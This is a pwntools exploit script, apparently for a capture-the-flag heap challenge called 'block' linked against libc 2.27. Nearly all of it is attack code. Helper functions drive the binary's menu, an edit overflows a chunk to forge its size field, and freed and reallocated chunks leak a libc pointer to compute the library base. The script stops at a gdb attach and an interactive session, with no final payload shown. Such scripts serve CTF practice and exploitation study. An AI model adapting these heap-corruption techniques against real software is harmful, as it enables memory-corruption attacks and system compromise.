from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

io=process('./block')
libc=ELF('./libc-2.27.so')

def add(t,size,data):
    io.recvuntil('Choice >>')
    io.sendline('1')
    io.recvuntil("Block's type: ")
    io.sendline(str(t))
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)


def free(idx):
    io.recvuntil('Choice >>')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(idx))


def edit(idx,data):
    io.recvuntil('Choice >>')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(idx))
    io.recvuntil('content:')
    io.sendline(data)

def show(idx):
    io.recvuntil('Choice >>')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(idx))


add(3,0x78,'c'*0x78)#0
add(1,0x410,'d'*0x410)#1
add(3,0x78,'a'*0x78)#2
add(3,0x78,'b'*0x78)#3
add(3,0x78,'b'*0x78)#4
add(3,0x78,'b'*0x78)#5
add(3,0x78,'b'*0x78)#6
#free(0)
free(5)
free(6)

edit(0,'a'*0x78+p64(0xa1))
free(1)
add(1,0x410,'d'*0x410)#1
show(2)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebca0
print(hex(libc_base))
add(3,0x78,'a'*0x78)#5
free(5)
#free(2)

gdb.attach(io)

io.interactive()
